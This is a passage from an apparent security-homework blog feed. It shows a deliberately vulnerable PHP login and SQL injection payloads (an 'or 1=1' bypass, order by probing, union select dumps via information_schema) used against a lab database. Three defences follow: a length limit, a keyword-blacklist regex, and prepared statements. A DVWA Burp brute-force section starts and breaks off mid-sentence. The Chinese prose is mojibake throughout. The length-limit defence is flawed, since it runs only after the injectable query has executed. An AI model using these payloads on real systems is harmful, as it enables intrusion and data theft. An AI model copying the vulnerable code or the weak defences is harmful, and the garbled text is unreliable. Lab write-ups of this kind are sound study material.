class="hljs-variable">$mysqli</span> = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);  <span class="hljs-comment">// æ•°æ®åº“æœåŠ¡å™¨çš„ä¸»æœºåè¿™é‡Œä½¿ç”¨çš„æœ¬åœ°ä¸»æœºï¼Œå¯†ç ï¼Œä½¿ç”¨çš„æ•°æ®åº“å</span><span class="hljs-keyword">if</span>(mysqli_connect_errno())&#123;    printf(<span class="hljs-string">&quot;fail:%s&lt;br&gt;&quot;</span>,mysqli_connect_error());    <span class="hljs-keyword">exit</span>();&#125;<span class="hljs-variable">$result</span> = <span class="hljs-variable">$mysqli</span>-&gt;query(<span class="hljs-string">&quot;select * from users where username=&#x27;<span class="hljs-subst">$uname</span>&#x27; and password=&#x27;<span class="hljs-subst">$pwd</span>&#x27;&quot;</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;TABLE border=1,width=400&gt;&quot;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;&quot;</span>;<span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>=mysqli_fetch_row(<span class="hljs-variable">$result</span>))&#123;printf (<span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;&quot;</span>,<span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>],<span class="hljs-variable">$row</span>[<span class="hljs-number">2</span>]);       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;login success&quot;</span>;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;username or password error&quot;</span>;&#125;<span class="hljs-comment">// echo &quot;&lt;/TABLE&gt;&quot;;</span><span class="hljs-comment">// echo &quot;&lt;/div&gt;&quot;;</span><span class="hljs-variable">$mysqli</span>-&gt;close();<span class="hljs-variable">$result</span>-&gt;close();<span class="hljs-meta">?&gt;</span></code></pre><p>é€»è¾‘å¾ˆç®€å•ï¼Œåœ¨login.phpé¡µé¢æäº¤ç”¨æˆ·åå’Œå¯†ç ï¼Œå°†usernameå’Œpasswordå‘é€åˆ°check.phpé¡µé¢è¿æ¥æ•°æ®åº“æ£€æŸ¥ç”¨æˆ·æ˜¯å¦åˆæ³•ï¼Œç”¨æˆ·åå’Œå¯†ç éƒ½æ­£ç¡®åˆ™ï¼Œæ‰“å°å‡ºç”¨æˆ·åå’Œå¯†ç ã€‚</p><p>åœ¨æ•°æ®åº“å»ºç«‹äº†ä¸€å¼ userså’Œflagè¡¨ï¼Œä¾¿äºæ³¨å…¥ã€‚</p><p>è¡¨ä¸­çš„å†…å®¹å¦‚ä¸‹</p><p><img src="https://i.loli.net/2020/11/13/YACXPd9oOZvhfxN.png" alt="sql1.png"></p><p><img src="https://i.loli.net/2020/11/13/oTqy8WhX6CGwS9A.png" alt="sql2.png"></p><p><img src="https://i.loli.net/2020/11/13/ghDmGtqeQLCyNZz.png" alt="sql3.png"></p><h3 id="1-æ¼æ´åˆ©ç”¨"><a href="#1-æ¼æ´åˆ©ç”¨" class="headerlink" title="1.æ¼æ´åˆ©ç”¨"></a>1.æ¼æ´åˆ©ç”¨</h3><p>ç›´æ¥ä½¿ç”¨ä¸‡èƒ½å¯†ç ç™»é™†</p><pre><code class="hljs apache"><span class="hljs-attribute">username</span>:<span class="hljs-number">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> #<span class="hljs-attribute">username</span>:<span class="hljs-number">111</span></code></pre><p>ç»“æœæ‰“å°å‡ºäº†ç¬¬ä¸€ä¸ªç”¨æˆ·çš„ç”¨æˆ·åå’Œå¯†ç </p><p><img src="https://i.loli.net/2020/11/13/omqb2AzDvC4w69g.png" alt="sql4.png"></p><p>è¿™ä¸ªç»“æœä¹Ÿè¯´åäº†æ˜¯å­—ç¬¦å‹æ³¨å…¥ï¼Œæ¥ä¸‹æ¥åˆ©ç”¨æ”¹æ³¨å…¥ç‚¹è·å–flag</p><h4 id="åˆ¤æ–­è¡¨æœ‰å‡ åˆ—"><a href="#åˆ¤æ–­è¡¨æœ‰å‡ åˆ—" class="headerlink" title="åˆ¤æ–­è¡¨æœ‰å‡ åˆ—"></a>åˆ¤æ–­è¡¨æœ‰å‡ åˆ—</h4><pre><code class="hljs crmsh"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">3</span><span class="hljs-comment">#</span>é¡µé¢æ˜¾ç¤ºæ­£å¸¸ï¼Œè€Œæ”¹ä¸º<span class="hljs-number">4</span>çš„æ—¶å€™ç½‘é¡µå‡ºç°æŠ¥é”™ï¼Œè¯´æ˜äº†åªæœ‰ä¸‰åˆ—<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">4</span><span class="hljs-comment">#</span></code></pre><h4 id="åˆ¤æ–­æ˜¾ç¤ºä½"><a href="#åˆ¤æ–­æ˜¾ç¤ºä½" class="headerlink" title="åˆ¤æ–­æ˜¾ç¤ºä½"></a>åˆ¤æ–­æ˜¾ç¤ºä½</h4><pre><code class="hljs gauss">&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">database</span>(),<span class="hljs-number">3</span><span class="hljs-meta">#</span></code></pre><p>è¯´æ˜æœ‰ä¸¤ä¸ªæ˜¾ç¤ºä½ï¼Œé€‰æ‹©å…¶ä¸­ä¸€ä¸ªä½ç½®è¿›è¡Œæ³¨å…¥å³å¯ã€‚</p><h4 id="è·å–è¡¨å"><a href="#è·å–è¡¨å" class="headerlink" title="è·å–è¡¨å"></a>è·å–è¡¨å</h4><pre><code class="hljs gauss">&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">group_concat</span>(table_name),<span class="hljs-number">3</span> from information_schema.TABLES <span class="hljs-built_in">where</span> TABLE_SCHEMA=<span class="hljs-built_in">database</span>()<span class="hljs-meta">#</span></code></pre><p><img src="https://i.loli.net/2020/11/13/btQg6vFRZipUd1n.png" alt="sql6.png"></p><h4 id="è·å–åˆ—å"><a href="#è·å–åˆ—å" class="headerlink" title="è·å–åˆ—å"></a>è·å–åˆ—å</h4><pre><code class="hljs gauss">&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">group_concat</span>(COLUMN_name),<span class="hljs-number">3</span> from information_schema.COLUMNS <span class="hljs-built_in">where</span> TABLE_NAME=&#x27;flag&#x27;<span class="hljs-meta">#</span></code></pre><p><img src="https://i.loli.net/2020/11/13/KlwToCWSGiau4FM.png" alt="sql7.png"></p><p>ï¼ˆfl4gæ˜¯dvwaå®éªŒä¸­å»ºç«‹æ²¡æœ‰åˆ é™¤ï¼Œæ‰€ä»¥ä¹Ÿæ˜¾ç¤ºå‡ºæ¥äº†ï¼‰</p><h4 id="è·å–flag"><a href="#è·å–flag" class="headerlink" title="è·å–flag"></a>è·å–flag</h4><pre><code class="hljs capnproto">&#x27; <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,group_concat(flag),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> flag<span class="hljs-comment">#</span></code></pre><p><img src="https://i.loli.net/2020/11/13/wIQmSv7oCeXVWiR.png" alt="sqlflag.png"></p><h3 id="2-æ¼æ´é˜²å¾¡"><a href="#2-æ¼æ´é˜²å¾¡" class="headerlink" title="2.æ¼æ´é˜²å¾¡"></a>2.æ¼æ´é˜²å¾¡</h3><h4 id="æ–¹æ³•ä¸€ï¼š"><a href="#æ–¹æ³•ä¸€ï¼š" class="headerlink" title="æ–¹æ³•ä¸€ï¼š"></a><strong>æ–¹æ³•ä¸€ï¼š</strong></h4><p>æœ€ç®€å•çš„æ–¹æ³•å¯¹ç”¨æˆ·åå’Œå¯†ç çš„é•¿åº¦é™åˆ¶ï¼Œä¸€èˆ¬ç”¨æˆ·åçš„é•¿åº¦ä¸è¶…è¿‡åäº”ä¸ªå­—ç¬¦ï¼Œè€Œå¯†ç çš„é•¿åº¦ä¸€èˆ¬ä¸è¶…è¿‡16ä¸ªå­—ç¬¦é•¿åº¦ï¼Œæ‰€ä»¥å¯¹ç”¨æˆ·è¾“å…¥é™åˆ¶é•¿åº¦æ˜¯æœ€æœ‰æ•ˆçš„æ–¹æ³•ä¹‹ä¸€ã€‚å› ä¸ºä¸€èˆ¬çš„æ³¨å…¥è¯­å¥éƒ½æ˜¯è¶…è¿‡åå…­ä¸ªå­—ç¬¦çš„ï¼Œæƒ³è¦åœ¨åå…­ä¸ªå­—ç¬¦ä¹‹å†…æ„é€ å‡ºæœ‰æ•ˆçš„æ³¨å…¥è¯­å¥æ˜¯ä¸€ä»¶å¾ˆéš¾çš„äº‹æƒ…ã€‚</p><p>ä»£ç å®ç°</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$pwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<span class="hljs-variable">$mysqli</span> = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);  <span class="hljs-comment">// æ•°æ®åº“æœåŠ¡å™¨çš„ä¸»æœºåè¿™é‡Œä½¿ç”¨çš„æœ¬åœ°ä¸»æœºï¼Œå¯†ç ï¼Œä½¿ç”¨çš„æ•°æ®åº“å</span><span class="hljs-keyword">if</span>(mysqli_connect_errno())&#123;    printf(<span class="hljs-string">&quot;fail:%s&lt;br&gt;&quot;</span>,mysqli_connect_error());    <span class="hljs-keyword">exit</span>();&#125;<span class="hljs-variable">$result</span> = <span class="hljs-variable">$mysqli</span>-&gt;query(<span class="hljs-string">&quot;select * from users where username=&#x27;<span class="hljs-subst">$uname</span>&#x27; and password=&#x27;<span class="hljs-subst">$pwd</span>&#x27;&quot;</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;TABLE border=1,width=400&gt;&quot;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;&quot;</span>;<span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$pwd</span>)&gt;=<span class="hljs-number">16</span>||strlen(<span class="hljs-variable">$uname</span>)&gt;=<span class="hljs-number">15</span>)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;It is too long.&quot;</span>;&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>=mysqli_fetch_row(<span class="hljs-variable">$result</span>))&#123;printf (<span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;&quot;</span>,<span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>],<span class="hljs-variable">$row</span>[<span class="hljs-number">2</span>]);       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;login success.&quot;</span>;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;username or password error.&quot;</span>;&#125;<span class="hljs-comment">// echo &quot;&lt;/TABLE&gt;&quot;;</span><span class="hljs-comment">// echo &quot;&lt;/div&gt;&quot;;</span><span class="hljs-variable">$mysqli</span>-&gt;close();<span class="hljs-variable">$result</span>-&gt;close();<span class="hljs-meta">?&gt;</span></code></pre><h4 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a><strong>æ–¹æ³•äºŒ</strong></h4><p>å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œæ£€æµ‹å’Œè¿‡æ»¤ï¼Œå°†å…¶è¾“å…¥çš„å¯èƒ½äº§ç”Ÿæ¶æ„è¡Œä¸ºçš„ä»£ç åˆ é™¤æˆ–è€…è½¬ä¹‰ï¼Œä½¿å…¶å¤±å»åŸæ¥çš„åŠŸèƒ½ã€‚</p><p>ä»£ç å®ç°</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$pwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<span class="hljs-comment">//echo &quot;select * from admin where passward=&#x27;$pwd&#x27; and name=&#x27;$uname&#x27;&lt;br/&gt;&quot;;</span><span class="hljs-comment">//echo &quot;&lt;hr&gt;&quot;;</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">inject_check</span>(<span class="hljs-params"><span class="hljs-variable">$Sql_Str</span></span>) </span>&#123;<span class="hljs-comment">//è‡ªåŠ¨è¿‡æ»¤Sqlçš„æ³¨å…¥è¯­å¥ã€‚</span>   <span class="hljs-variable">$check</span>=preg_match(<span class="hljs-string">&#x27;/select|from|where|if|database|order|insert|update|or|group_concat|\&#x27;|\\*|\*|\.\.\/|\.\/|union|and|ascii|substring|sleep/i&#x27;</span>,<span class="hljs-variable">$Sql_Str</span>);    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$check</span>) &#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script language=&quot;JavaScript&quot;&gt;alert(&quot;hacker&quot;);&lt;/script&gt;&#x27;</span>;        <span class="hljs-keyword">exit</span>();    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-variable">$Sql_Str</span>;    &#125;&#125;<span class="hljs-variable">$pwd</span>=inject_check(<span class="hljs-variable">$pwd</span>);<span class="hljs-variable">$uname</span> = inject_check(<span class="hljs-variable">$uname</span>);<span class="hljs-variable">$mysqli</span> = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);  <span class="hljs-comment">// æ•°æ®åº“æœåŠ¡å™¨çš„ä¸»æœºåè¿™é‡Œä½¿ç”¨çš„æœ¬åœ°ä¸»æœºï¼Œå¯†ç ï¼Œä½¿ç”¨çš„æ•°æ®åº“å</span><span class="hljs-keyword">if</span>(mysqli_connect_errno())&#123;    printf(<span class="hljs-string">&quot;fail:%s&lt;br&gt;&quot;</span>,mysqli_connect_error());    <span class="hljs-keyword">exit</span>();&#125;<span class="hljs-variable">$result</span> = <span class="hljs-variable">$mysqli</span>-&gt;query(<span class="hljs-string">&quot;select * from users where username=&#x27;<span class="hljs-subst">$uname</span>&#x27; and password=&#x27;<span class="hljs-subst">$pwd</span>&#x27;&quot;</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;TABLE border=1,width=400&gt;&quot;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;&quot;</span>;<span class="hljs-comment">// if(strlen($pwd)&gt;=16||strlen($uname)&gt;=15)</span><span class="hljs-comment">// &#123;</span><span class="hljs-comment">// echo &quot;It is too long.&quot;;</span><span class="hljs-comment">// &#125;</span><span class="hljs-comment">// else </span><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>=mysqli_fetch_row(<span class="hljs-variable">$result</span>))&#123;printf (<span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;&quot;</span>,<span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>],<span class="hljs-variable">$row</span>[<span class="hljs-number">2</span>]);       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;login success.&quot;</span>;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;username or password error.&quot;</span>;&#125;<span class="hljs-comment">// echo &quot;&lt;/TABLE&gt;&quot;;</span><span class="hljs-comment">// echo &quot;&lt;/div&gt;&quot;;</span><span class="hljs-variable">$mysqli</span>-&gt;close();<span class="hljs-variable">$result</span>-&gt;close();<span class="hljs-meta">?&gt;</span></code></pre><p>è¿‡æ»¤å‡½æ•°å¦‚ä¸‹ï¼Œå…¶ä¸­å°†ä¸€èˆ¬æ³¨å…¥éœ€è¦ç”¨åˆ°çš„å‡½æ•°å’Œç¬¦å·éƒ½è¿‡æ»¤äº†ã€‚</p><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">inject_check</span>(<span class="hljs-params"><span class="hljs-variable">$Sql_Str</span></span>) </span>&#123;<span class="hljs-comment">//è‡ªåŠ¨è¿‡æ»¤Sqlçš„æ³¨å…¥è¯­å¥ã€‚</span>    <span class="hljs-variable">$check</span>=preg_match(<span class="hljs-string">&#x27;/select|from|where|if|database|order|insert|update|or|group_concat|\&#x27;|\\*|\*|\.\.\/|\.\/|union|and|ascii|substring|sleep/i&#x27;</span>,<span class="hljs-variable">$Sql_Str</span>);    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$check</span>) &#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script language=&quot;JavaScript&quot;&gt;alert(&quot;hacker&quot;);&lt;/script&gt;&#x27;</span>;        <span class="hljs-keyword">exit</span>();    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-variable">$Sql_Str</span>;    &#125;&#125;</code></pre><h4 id="æ–¹æ³•ä¸‰"><a href="#æ–¹æ³•ä¸‰" class="headerlink" title="æ–¹æ³•ä¸‰"></a><strong>æ–¹æ³•ä¸‰</strong></h4><p>ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥</p><p>ä»£ç å¦‚ä¸‹</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$pwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<span class="hljs-comment">// function inject_check($Sql_Str) &#123;//è‡ªåŠ¨è¿‡æ»¤Sqlçš„æ³¨å…¥è¯­å¥ã€‚</span><span class="hljs-comment">//     $check=preg_match(&#x27;/select|from|where|if|database|order|insert|update|or|group_concat|\&#x27;|\\*|\*|\.\.\/|\.\/|union|and|ascii|substring|sleep/i&#x27;,$Sql_Str);</span><span class="hljs-comment">//     if ($check) &#123;</span><span class="hljs-comment">//         echo &#x27;&lt;script language=&quot;JavaScript&quot;&gt;alert(&quot;hacker&quot;);&lt;/script&gt;&#x27;;</span><span class="hljs-comment">//         exit();</span><span class="hljs-comment">//     &#125;else&#123;</span><span class="hljs-comment">//         return $Sql_Str;</span><span class="hljs-comment">//     &#125;</span><span class="hljs-comment">// &#125;</span><span class="hljs-comment">// $pwd=inject_check($pwd);</span><span class="hljs-comment">// $uname = inject_check($uname);</span><span class="hljs-comment">// </span><span class="hljs-variable">$mysqli</span> = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);  <span class="hljs-comment">// æ•°æ®åº“æœåŠ¡å™¨çš„ä¸»æœºåè¿™é‡Œä½¿ç”¨çš„æœ¬åœ°ä¸»æœºï¼Œå¯†ç ï¼Œä½¿ç”¨çš„æ•°æ®åº“å</span><span class="hljs-keyword">if</span>(mysqli_connect_errno())&#123;    printf(<span class="hljs-string">&quot;fail:%s&lt;br&gt;&quot;</span>,mysqli_connect_error());    <span class="hljs-keyword">exit</span>();&#125;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;TABLE border=1,width=400&gt;&quot;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;&quot;</span>;<span class="hljs-variable">$result</span> =  <span class="hljs-variable">$mysqli</span>-&gt;prepare(<span class="hljs-string">&quot;select * from users where username=? and password=?&quot;</span>);<span class="hljs-variable">$result</span>-&gt;bind_param(<span class="hljs-string">&#x27;ss&#x27;</span>,<span class="hljs-variable">$uname</span>,<span class="hljs-variable">$pwd</span>);<span class="hljs-variable">$result</span>-&gt;execute();<span class="hljs-variable">$result</span>-&gt;store_result();<span class="hljs-variable">$result</span>-&gt;bind_result(<span class="hljs-variable">$id</span>,<span class="hljs-variable">$un</span>,<span class="hljs-variable">$pd</span>); <span class="hljs-comment">//å°†æŸ¥è¯¢åˆ°çš„å˜é‡ç»‘å®šåˆ°ä¸‰ä¸ªè‡ªå®šä¹‰çš„å˜é‡ä¸­ï¼Œè¾“å‡ºæ—¶ç›´æ¥è¾“å‡ºè¿™ä¸‰ä¸ªå˜é‡å³å¯ã€‚</span><span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>-&gt;fetch())&#123;printf(<span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;&quot;</span>,<span class="hljs-variable">$un</span>,<span class="hljs-variable">$pd</span>);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;username or password error.&quot;</span>;&#125;<span class="hljs-comment">// if(strlen($pwd)&gt;=16||strlen($uname)&gt;=15)</span><span class="hljs-comment">// &#123;</span><span class="hljs-comment">// echo &quot;It is too long.&quot;;</span><span class="hljs-comment">// &#125;</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/TABLE&gt;&quot;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/div&gt;&quot;</span>;<span class="hljs-variable">$result</span>-&gt;close();<span class="hljs-variable">$mysqli</span>-&gt;close();<span class="hljs-meta">?&gt;</span></code></pre><p>åº”ç”¨é¢„ç¼–è¯‘è¯­å¥åï¼Œå†æ¬¡è¾“å…¥æ³¨å…¥è¯­å¥åå°±ä¸å†èµ·åˆ°æ³¨å…¥ä½œç”¨ï¼Œåªæ˜¯å°†å…¶å½“æˆæ­£å¸¸çš„æŸ¥è¯¢è¿‡ç¨‹ï¼Œè¿”å›ç›¸åº”çš„ç»“æœã€‚</p>]]></content>
    
    
    <categories>
      
      <category>ç½‘å®‰ä½œä¸š</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql</tag>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç½‘å®‰ä½œä¸š2</title>
    <link href="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/"/>
    <url>/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/</url>
    
    <content type="html"><![CDATA[<h1 id="DVWAå®éªŒ"><a href="#DVWAå®éªŒ" class="headerlink" title="DVWAå®éªŒ"></a>DVWAå®éªŒ</h1><p>ä¸€ä¸‹éƒ½æ˜¯åŸºäºlow,mid,highçº§åˆ«çš„å®éªŒï¼Œä¸ºäº†æ–¹ä¾¿å™è¿°ï¼Œæå‰åœ¨æ•°æ®åº“ä¸­å»ºäº†ä¸€ä¸ªflagè¡¨</p><h2 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h2><p>ä½¿ç”¨å·¥å…· ï¼šbp</p><p>ä½¿ç”¨ææ–™ï¼šå¯†ç å­—å…¸</p><h3 id="bpçš„å››ç§çˆ†ç ´æ”»å‡»ç±»å‹"><a href="#bpçš„å››ç§çˆ†ç ´æ”»å‡»ç±»å‹" class="headerlink" title="bpçš„å››ç§çˆ†ç ´æ”»å‡»ç±»å‹"></a>bpçš„å››ç§çˆ†ç ´æ”»å‡»ç±»å‹</h3><h4 id="ç¬¬ä¸€ç§ï¼š"><a href="#ç¬¬ä¸€ç§ï¼š" class="headerlink" title="ç¬¬ä¸€ç§ï¼š"></a>ç¬¬ä¸€ç§ï¼š</h4><p>Sniperæ ‡ç­¾ è¿™ä¸ªæ˜¯æˆ‘ä»¬æœ€å¸¸ç”¨çš„ï¼ŒSniperæ˜¯ç‹™å‡»æ‰‹çš„æ„æ€ã€‚è¿™ä¸ªæ¨¡å¼ä¼šä½¿ç”¨å•ä¸€çš„payloadã€å°±æ˜¯å¯¼å…¥å­—å…¸çš„payloadã€‘ç»„ã€‚å®ƒä¼šé’ˆå¯¹æ¯ä¸ªpositionä¸­$$ä½ç½®è®¾ç½®payloadã€‚è¿™ç§æ”»å‡»ç±»å‹é€‚åˆå¯¹å¸¸è§æ¼æ´ä¸­çš„è¯·æ±‚å‚æ•°å•ç‹¬åœ°è¿›è¡Œæµ‹è¯•ã€‚æ”»å‡»ä¸­çš„è¯·æ±‚æ€»æ•°åº”è¯¥æ˜¯positionæ•°é‡å’Œpayloadæ•°é‡çš„ä¹˜ç§¯ã€‚</p><h4 id="ç¬¬äºŒç§ï¼š"><a href="#ç¬¬äºŒç§ï¼š" class="headerlink" title="ç¬¬äºŒç§ï¼š"></a>ç¬¬äºŒç§ï¼š</h4><p>Battering ram â€“ è¿™ä¸€æ¨¡å¼æ˜¯ä½¿ç”¨å•ä¸€çš„payloadç»„ã€‚å®ƒä¼šé‡å¤payloadå¹¶ä¸”ä¸€æ¬¡æŠŠæ‰€æœ‰ç›¸åŒçš„payloadæ”¾å…¥æŒ‡å®šçš„ä½ç½®ä¸­ã€‚è¿™ç§æ”»å‡»é€‚åˆé‚£ç§éœ€è¦åœ¨è¯·æ±‚ä¸­æŠŠç›¸åŒçš„è¾“å…¥æ”¾åˆ°å¤šä¸ªä½ç½®çš„æƒ…å†µã€‚è¯·æ±‚çš„æ€»æ•°æ˜¯payloadç»„ä¸­payloadçš„æ€»æ•°ã€‚ç®€å•è¯´å°±æ˜¯ä¸€ä¸ªplayloadå­—å…¸åŒæ—¶åº”ç”¨åˆ°å¤šä¸ªpositionä¸­</p><h4 id="ç¬¬ä¸‰ç§ï¼š"><a href="#ç¬¬ä¸‰ç§ï¼š" class="headerlink" title="ç¬¬ä¸‰ç§ï¼š"></a>ç¬¬ä¸‰ç§ï¼š</h4><p>Pitchfork â€“ è¿™ä¸€æ¨¡å¼æ˜¯ä½¿ç”¨å¤šä¸ªpayloadç»„ã€‚å¯¹äºå®šä¹‰çš„ä½ç½®å¯ä»¥ä½¿ç”¨ä¸åŒçš„payloadç»„ã€‚æ”»å‡»ä¼šåŒæ­¥è¿­ä»£æ‰€æœ‰çš„payloadç»„ï¼ŒæŠŠpayloadæ”¾å…¥æ¯ä¸ªå®šä¹‰çš„ä½ç½®ä¸­ã€‚æ¯”å¦‚ï¼špositionä¸­Aå¤„æœ‰aå­—å…¸ï¼ŒBå¤„æœ‰bå­—å…¸ï¼Œåˆ™aã€1ã€‘å°†ä¼šå¯¹åº”bã€1ã€‘è¿›è¡Œattackå¤„ç†ï¼Œè¿™ç§æ”»å‡»ç±»å‹éå¸¸é€‚åˆé‚£ç§ä¸åŒä½ç½®ä¸­éœ€è¦æ’å…¥ä¸åŒä½†ç›¸å…³çš„è¾“å…¥çš„æƒ…å†µã€‚è¯·æ±‚çš„æ•°é‡åº”è¯¥æ˜¯æœ€å°çš„payloadç»„ä¸­çš„payloadæ•°é‡</p><h4 id="ç¬¬å››ç§ï¼š"><a href="#ç¬¬å››ç§ï¼š" class="headerlink" title="ç¬¬å››ç§ï¼š"></a>ç¬¬å››ç§ï¼š</h4><p>Cluster bomb â€“ 